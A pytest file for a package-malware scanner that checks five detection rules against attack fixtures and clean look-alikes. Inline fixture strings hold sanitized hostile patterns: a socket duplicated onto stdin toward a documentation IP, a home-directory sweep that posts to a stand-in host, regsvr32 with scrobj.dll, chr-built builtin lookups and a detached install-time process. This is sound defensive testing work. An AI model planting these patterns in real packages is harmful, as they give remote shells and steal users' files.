"""Research 2026-11-09: five PyPI malware shapes, each paired with an honest look-alike.

Sanitized fixtures only (``.invalid``/``.test`` hosts, documentation IPs, inert commands).

* ``ST-PY-BUILTIN-NAME-LOOKUP`` -- ``getattr(builtins, chr(..)+...)``.
* ``ST-PY-SCRIPTLET-HOST`` -- regsvr32/scrobj started from setup.py.
* ``ST-PY-SOCKET-SHELL`` -- connected socket dup2'd onto the standard streams.
* ``ST-PY-MAIN-FILE-HARVEST`` -- ``__main__`` sweeping the home directory by file type.
* ``ST-PY-SETUP-DETACHED-FETCH`` -- install command override with a detached, fetching process.
"""

from __future__ import annotations

from pathlib import Path

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory

_CORPUS = Path(__file__).resolve().parent / "eval_corpus"

_PAIRS = [
    ("ST-PY-BUILTIN-NAME-LOOKUP", "AST01", "builtin-name-lookup", "chr-built-exec",
     "named-builtin-lookup"),
    ("ST-PY-SOCKET-SHELL", "AST01", "socket-shell", "import-time-reverse-shell",
     "plain-socket-client"),
    ("ST-PY-MAIN-FILE-HARVEST", "AST01", "main-file-harvest", "module-run-watcher",
     "project-report"),
    ("ST-PY-SCRIPTLET-HOST", "AST02", "scriptlet-host", "setup-regsvr32", "setup-compile-step"),
    ("ST-PY-SETUP-DETACHED-FETCH", "AST02", "setup-detached-fetch", "install-override-poller",
     "install-build-step"),
]


def _report(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def test_each_attack_flagged_and_lookalike_clean():
    for rule_id, ast, tech, pos, neg in _PAIRS:
        report = _report(_CORPUS / "positive" / ast / tech / pos)
        finding = next((f for f in report.findings if f.id == rule_id), None)
        assert finding is not None, f"{rule_id} missed its positive"
        assert finding.evidence
        assert report.verdict.get("has_malicious_indicators") is True
        clean = _report(_CORPUS / "negative" / ast / tech / neg)
        assert rule_id not in {f.id for f in clean.findings}, f"{rule_id} fired on {neg}"
        assert clean.verdict.get("has_malicious_indicators") is not True
        assert clean.risk_level.value not in ("high", "critical")


def test_builtin_lookup_needs_char_codes(tmp_path):
    (tmp_path / "a.py").write_text("import builtins\nf = getattr(builtins, name)\n")
    assert "ST-PY-BUILTIN-NAME-LOOKUP" not in _ids(tmp_path)
    (tmp_path / "b.py").write_text("import builtins\nf = getattr(builtins, chr(101) + chr(118))\n")
    assert "ST-PY-BUILTIN-NAME-LOOKUP" in _ids(tmp_path)


def test_scriptlet_host_variants(tmp_path):
    call = 'import subprocess\nsubprocess.run(["regsvr32", "/s", "%s"])\n'
    (tmp_path / "a.py").write_text(call % "scrobj.dll")
    assert "ST-PY-SCRIPTLET-HOST" in _ids(tmp_path)
    clean = tmp_path / "clean"
    clean.mkdir()
    (clean / "a.py").write_text(call % "mylib.dll")
    assert "ST-PY-SCRIPTLET-HOST" not in _ids(clean)


def test_socket_shell_needs_the_socket_descriptor(tmp_path):
    (tmp_path / "a.py").write_text(
        "import os, socket\n"
        "c = socket.socket()\n"
        "c.connect(('192.0.2.1', 1))\n"
        "os.dup2(c.fileno(), 0)\n"
    )
    assert "ST-PY-SOCKET-SHELL" in _ids(tmp_path)
    other = tmp_path / "other"
    other.mkdir()
    (other / "a.py").write_text(
        "import os, socket\n"
        "c = socket.socket()\n"
        "c.connect(('192.0.2.1', 1))\n"
        "log = open('x.log', 'w')\n"
        "os.dup2(log.fileno(), 1)\n"
    )
    assert "ST-PY-SOCKET-SHELL" not in _ids(other)


def test_main_harvest_needs_entry_point_and_home_walk(tmp_path):
    body = (
        "import os, urllib.request, time\n"
        "E = ('.pdf', '.docx', '.key')\n"
        "def go():\n"
        "    while True:\n"
        "        for r, d, fs in os.walk(os.path.expanduser('~')):\n"
        "            urllib.request.urlopen('https://x.example.test/', data=b'1')\n"
        "        time.sleep(5)\n"
    )
    (tmp_path / "lib.py").write_text(body)
    assert "ST-PY-MAIN-FILE-HARVEST" not in _ids(tmp_path)  # a library, no entry point
    (tmp_path / "lib.py").write_text(body + "if __name__ == '__main__':\n    go()\n")
    assert "ST-PY-MAIN-FILE-HARVEST" in _ids(tmp_path)


def test_setup_detached_needs_cmdclass_and_fetch(tmp_path):
    src = (
        "import subprocess, sys\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class I(install):\n"
        "    def run(self):\n"
        "        subprocess.Popen([sys.executable, 'helper.py'], start_new_session=True)\n"
        "setup(name='x', cmdclass={'install': I})\n"
    )
    (tmp_path / "setup.py").write_text(src)
    assert "ST-PY-SETUP-DETACHED-FETCH" not in _ids(tmp_path)  # detached, but no network fetch
